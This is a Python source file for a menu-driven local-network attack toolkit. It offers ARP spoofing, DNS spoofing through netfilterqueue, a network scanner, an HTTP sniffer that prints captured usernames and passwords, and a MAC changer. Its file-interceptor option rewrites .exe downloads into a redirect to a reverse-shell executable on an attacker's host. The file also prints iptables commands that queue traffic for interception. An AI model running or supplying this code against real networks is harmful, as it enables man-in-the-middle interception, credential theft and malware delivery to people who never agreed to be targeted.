#!/usr/bin/env python3
#For performing attack on local machine input and output chains to be used to create queue
#"iptables -I INPUT -j NFQUEUE --queue-num 0" - INPUT CHAIN 
#"iptables -I OUTPUT -j NFQUEUE --queue-num 0"- OUTPUT CHAIN
# For performing attacks on remote machine forward chain to be used to create queue
#"iptables -I FORWARD -j NFQUEUE --queue-num 0"- FORWARD CHAIN


import scapy.all as scapy
import time
import sys
import os
import netfilterqueue
from colorama import Fore, Style
import argparse
import optparse
from scapy.layers import http
from arp_spoof import spoof, restore
from network_scanner import scan, print_result
from packet_sniffer import get_url, get_login_info
from Mac_Changer import getmac, macchanger

def cmd():
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.RED + Style.DIM + "For performing attack on local machine use the following commands")
    print(Fore.CYAN + "-> iptables -I INPUT -j NFQUEUE --queue-num 0")
    print(Fore.CYAN + "-> iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.RED + Style.DIM + "For performing attack on remote machine use the following commands")
    print(Fore.CYAN + Style.BRIGHT + "-> iptables -I FORWARD -j NFQUEUE --queue-num 0")
    print(Style.RESET_ALL)


if __name__ == "__main__":
    """
    HEADER
    """
    # Header Header header---------------------------------------------------------------------------
    #banner = pyfiglet.figlet_format("Network Attacks", font = "slant"  ) 
    print(Fore.BLUE + Style.BRIGHT + """

    // ░░░    ░░ ░░░░░░░ ░░░░░░░░ ░░     ░░  ░░░░░░  ░░░░░░  ░░   ░░      ░░░░░  ░░░░░░░░ ░░░░░░░░  ░░░░░   ░░░░░░ ░░   ░░ ░░░░░░░ 
    // ▒▒▒▒   ▒▒ ▒▒         ▒▒    ▒▒     ▒▒ ▒▒    ▒▒ ▒▒   ▒▒ ▒▒  ▒▒      ▒▒   ▒▒    ▒▒       ▒▒    ▒▒   ▒▒ ▒▒      ▒▒  ▒▒  ▒▒      
    // ▒▒ ▒▒  ▒▒ ▒▒▒▒▒      ▒▒    ▒▒  ▒  ▒▒ ▒▒    ▒▒ ▒▒▒▒▒▒  ▒▒▒▒▒       ▒▒▒▒▒▒▒    ▒▒       ▒▒    ▒▒▒▒▒▒▒ ▒▒      ▒▒▒▒▒   ▒▒▒▒▒▒▒ 
    // ▓▓  ▓▓ ▓▓ ▓▓         ▓▓    ▓▓ ▓▓▓ ▓▓ ▓▓    ▓▓ ▓▓   ▓▓ ▓▓  ▓▓      ▓▓   ▓▓    ▓▓       ▓▓    ▓▓   ▓▓ ▓▓      ▓▓  ▓▓       ▓▓ 
    // ██   ████ ███████    ██     ███ ███   ██████  ██   ██ ██   ██     ██   ██    ██       ██    ██   ██  ██████ ██   ██ ███████ 

    -------------- 💻💻💻💻💻💻💻💻💻 --------------- 👾👾👾👾👾👾👾👾👾 --------------------- 💻💻💻💻💻💻💻💻💻 ----------------
    
    //By ------------------ Heena Detani              |               https://github.com/heenadetani/Local-Area-Network-Attacks
    """ + Fore.LIGHTWHITE_EX)
    # Header Header header---------------------------------------------------------------------------
    # print(banner) 
    print(Fore.CYAN + "Welcome to Network Attacks in Local Area Network")
    print(Fore.CYAN + "Please select from below options")
    print(Fore.MAGENTA + "{0:<15} : {1:<15}".format("[+] ARP Spoofing","Press 1"))
    print("{0:<15} : {1:<15}".format("[+] DNS Spoofing","Press 2"))
    print("{0:<15} : {1:<15}".format("[+] File interceptor","Press 3"))
    print("{0:<15} : {1:<15}".format("[+] Newtork scanner","Press 4"))
    print("{0:<15} : {1:<15}".format("[+] Packet sniffer","Press 5"))
    print("{0:<15} : {1:<15}".format("[+] Mac Changer","Press 6"))
    n = int(input("Enter Your Choice ---> "))

    #---------------------ARP Spoofing--------------------------

    if n == 1:
        def arpSpoof():
            target_ip = input("Enter the target ip to spoof ---> ")
            gateway_ip = input("Enter the gateway ip  ---> ")
            try:
                sent_packets_count = 0
                while True:
                    spoof(target_ip, gateway_ip)
                    spoof(gateway_ip, target_ip)
                    sent_packets_count = sent_packets_count + 2
                    print("\r[+] Packets sent:" + str(sent_packets_count)),
                    sys.stdout.flush()
                    time.sleep(2)
            except KeyboardInterrupt:
                print("\n[-] Detected CTRl + C... Reseting ARP tables...Please wait.\n")
                restore(target_ip, gateway_ip)
                restore(gateway_ip, target_ip)
        arpSpoof()

    #---------------------DNS Spoofing-----------------------------
    
    elif n == 2:
        cmd()
        website = input("[+] Please Enter website from which to redirect, \nLeave empty to redirect all traffic :")
        redirect_ip = input("[+] Please Enter IP to which redirect : ")

        def process_packet(packet):
            scapy_packet = scapy.IP(packet.get_payload())
            # to check if packet has DNS Response Record(DNSRR)
            if scapy_packet.haslayer(scapy.DNSRR):
                #qname = scapy_packet[scapy.DNSQR].qname
                b_qname = scapy_packet[scapy.DNSQR].qname
                qname = b_qname.decode('utf-8')
                if website in str(qname):
                    print(Fore.CYAN + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Redirecting " + str(qname) + " to " + redirect_ip)
                    #print ("[+] Spoofing target")
                    answer = scapy.DNSRR(rrname=b_qname, rdata=redirect_ip)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1
                    del scapy_packet[scapy.IP].len     # avoiding chksum error for IP Layer
                    del scapy_packet[scapy.IP].chksum  # avoiding len error for IP Layer
                    del scapy_packet[scapy.UDP].len    # avoiding chksum error for UDP Layer
                    del scapy_packet[scapy.UDP].chksum # avoiding len error for IP Layer
                    packet.set_payload(bytes(scapy_packet))  # setting altered packet
            packet.accept()
        queue = netfilterqueue.NetfilterQueue()
        #Binding and running queue
        queue.bind(0, process_packet)
        queue.run()


    #---------------------File Interceptor--------------------------

    elif n == 3:
        cmd()
        ack_list = []
        def set_load(packet, load):
            #setting packet to 
            packet[scapy.Raw].load = load
            # deleting some fields of IP and TCP header
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.TCP].chksum
            return packet
            
        def process_packet(packet):
            # converting the packet into a scapy packet for modification
            scapy_packet = scapy.IP(packet.get_payload())
            #print(scapy_packet)
            if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            # checking if the destination port is 80(default port for http) means that the packet is leaving from our computer and going to port 80
                if scapy_packet[scapy.TCP].dport == 80:
                # to check whether there is any exe file in the load field
                    if ".exe" in scapy_packet[scapy.Raw].load.decode():
                        print ("[+] exe request")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                
            # checking if the source port is 80(default port for http) means this is a packet is leaving from port 80
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print ("[+] Replacing file")
                    # redirecting request to my file location
                    modified_packet = set_load(
                        scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.44.128/evil-files/reverse_shell.exe\n\n")
                    # sent the modified packet
                    packet.set_payload(str(modified_packet).encode())
            packet.accept()
        
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
        

    #---------------------Network Scanner-------------------------
    
    elif n == 4:
        #scan_result = scan("192.168.133.1/24")
        def networkScan():
            #options = get_arguments()
            target = input("[+] Enter Target-IP Range ---> ")
            scan_result = scan(target)
            print_result(scan_result)
        networkScan()

    #--------------------Packet Sniffer----------------------
    
    elif n ==5:
        cmd()
        def sniff(interface):
                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
        
        def process_sniffed_packet(packet):
                if packet.haslayer(http.HTTPRequest):
                        #print(packet.show())
                        #In http request layer fields such as Host contain the 1st part of url(i.e domain name) and path contains the rest of url
                        url = get_url(packet)
                        print("[+] HTTP Request >>> " + format(url))
                        login_info = get_login_info(packet)
                        if login_info:
                                print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")                                
        interface = input("[+] Enter the interface on which you want to sniff traffic --->")	    
        sniff(interface)
        
        


    #----------------Mac Changer---------------------    
    
    elif n==6:
        interface = input("[+] Enter the interface to change the mac address ---> ")
        new_mac = input("[+] Enter the new MAC address ---> ")
        #function which change the mac address
        macchanger(interface,new_mac)
        
         #verify whether the mac is changed or Not
        final_mac = getmac(interface)
       
        if final_mac == new_mac:
            print ("Mac Address Successfully Chaged with new one -> %r"%final_mac)
        else:
            print ("Error Occured Fix It !!!")
    
    else:
        print("Invalid selection. Please run script one more time")

